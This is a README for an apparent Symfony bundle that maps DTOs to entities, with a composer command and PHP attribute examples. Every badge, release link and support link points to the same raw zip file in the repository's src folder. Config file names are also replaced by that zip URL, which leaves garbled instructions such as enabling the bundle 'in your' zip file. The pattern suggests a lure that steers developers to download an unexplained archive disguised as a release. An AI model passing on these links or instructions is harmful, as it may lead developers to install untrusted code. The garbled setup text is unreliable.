# Symfony Structured Mapper Bundle 🎉

![GitHub release](https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip)  
[![Download Releases](https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip%20Releases-Here-blue)](https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip)

Welcome to the **Symfony Structured Mapper Bundle**! This bundle provides an efficient way to map between Data Transfer Objects (DTOs) and Entities in Symfony applications. Leveraging the Structured Mapper library, it allows for clear and concise attribute-based mapping.

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Introduction

In modern PHP applications, especially those built with Symfony, managing data flow between different layers can be complex. DTOs serve as a bridge between your application and its data storage. This bundle simplifies the process of transforming data between these layers, ensuring your application remains clean and maintainable.

## Features

- **Attribute-based Mapping**: Use PHP attributes to define mappings directly in your DTOs.
- **Seamless Integration**: Works effortlessly with Symfony and Doctrine.
- **Easy Configuration**: Minimal setup required to get started.
- **Flexible**: Supports custom value transformers for complex mappings.
- **High Performance**: Built with performance in mind, using the Structured Mapper library.

## Installation

To install the Symfony Structured Mapper Bundle, you can use Composer. Run the following command in your terminal:

```bash
composer require sajidirnd/symfony-structured-mapper-bundle
```

After installation, ensure to enable the bundle in your `https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip` file:

```php
return [
    // Other bundles...
    Sajidirnd\SymfonyStructuredMapperBundle\SajidirndSymfonyStructuredMapperBundle::class => ['all' => true],
];
```

## Usage

To start using the Symfony Structured Mapper Bundle, you need to create your DTOs and Entities. The bundle allows you to define mappings directly within your DTOs using attributes.

### Example DTO

```php
namespace App\DTO;

use Sajidirnd\SymfonyStructuredMapperBundle\Attribute\MapTo;

class UserDTO
{
    #[MapTo('name')]
    public string $fullName;

    #[MapTo('email')]
    public string $emailAddress;

    #[MapTo('age')]
    public int $age;
}
```

### Example Entity

```php
namespace App\Entity;

class User
{
    private string $name;
    private string $email;
    private int $age;

    // Getters and setters...
}
```

## Configuration

You can customize the behavior of the bundle through your Symfony configuration files. The default configuration should suffice for most use cases, but advanced options are available.

### Example Configuration

In your `https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip`:

```yaml
symfony_structured_mapper:
    # Custom configuration options
    value_transformers:
        # Define your custom transformers here
```

## Examples

Here are some common use cases for the Symfony Structured Mapper Bundle:

### Mapping DTO to Entity

To map a DTO to an Entity, you can use the `Mapper` service provided by the bundle:

```php
use App\DTO\UserDTO;
use App\Entity\User;
use Sajidirnd\SymfonyStructuredMapperBundle\Service\Mapper;

class UserService
{
    private Mapper $mapper;

    public function __construct(Mapper $mapper)
    {
        $this->mapper = $mapper;
    }

    public function createUser(UserDTO $userDTO): User
    {
        $user = new User();
        $this->mapper->map($userDTO, $user);
        return $user;
    }
}
```

### Mapping Entity to DTO

Similarly, you can map an Entity back to a DTO:

```php
public function getUserDTO(User $user): UserDTO
{
    $userDTO = new UserDTO();
    $this->mapper->map($user, $userDTO);
    return $userDTO;
}
```

## Contributing

We welcome contributions to the Symfony Structured Mapper Bundle! If you have suggestions, bug fixes, or new features, please open an issue or submit a pull request.

### Steps to Contribute

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your forked repository.
5. Open a pull request.

## License

This bundle is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

## Support

For support, please check the [Releases](https://github.com/sajidirnd/symfony-structured-mapper-bundle/raw/refs/heads/main/src/structured-mapper-symfony-bundle-v3.1.zip) section for the latest updates and bug fixes. If you encounter issues, feel free to open an issue in the repository.

Thank you for using the Symfony Structured Mapper Bundle! We hope it makes your development process smoother and more efficient. Happy coding!